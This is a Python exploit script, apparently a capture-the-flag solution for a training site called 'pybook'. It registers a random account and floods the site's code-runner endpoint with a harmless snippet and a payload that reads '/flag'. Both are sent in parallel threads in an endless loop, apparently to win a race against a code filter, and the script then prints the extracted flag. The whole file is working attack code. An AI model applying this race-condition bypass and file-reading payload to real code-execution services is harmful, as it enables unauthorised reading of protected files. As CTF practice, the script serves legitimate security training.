import requests
import time
import threading
import string
import random

base_url = "http://pybook.training.jinblack.it/"

def random_user():
    username = ''.join(random.choice(string.ascii_lowercase) for i in range(10))
    password = ''.join(random.choice(string.ascii_lowercase) for i in range(10))
    return username, password

def login(session, username, password):
    login_url = base_url + 'login'
    response = session.post(login_url, data={'username': username, 'password': password})
    return response.text

def register(session, username, password):
    register_url = base_url + 'register'
    response = session.post(register_url, data={'username': username, 'password': password})
    return response.text

def post_code(session, code):
    run_url = base_url + 'run'
    # code is sent with no json, just text
    response = session.post(run_url, data=code)
    if 'flag' in response.text:
        flag = response.text.split('flag{')[1].split('}')[0]
        print('flag{' + flag + '}')
    return response.text

s = requests.Session()
u, p = random_user()

register(s, u, p)
login(s, u, p)

valid_code = "print('Hello World')"
exploit_code = "print(open('/flag').read())"

while True:
    t1 = threading.Thread(target=post_code, args=(s, valid_code))
    t2 = threading.Thread(target=post_code, args=(s, exploit_code))
    t1.start()
    t2.start()
    t1.join()
    t2.join()
    time.sleep(0.1)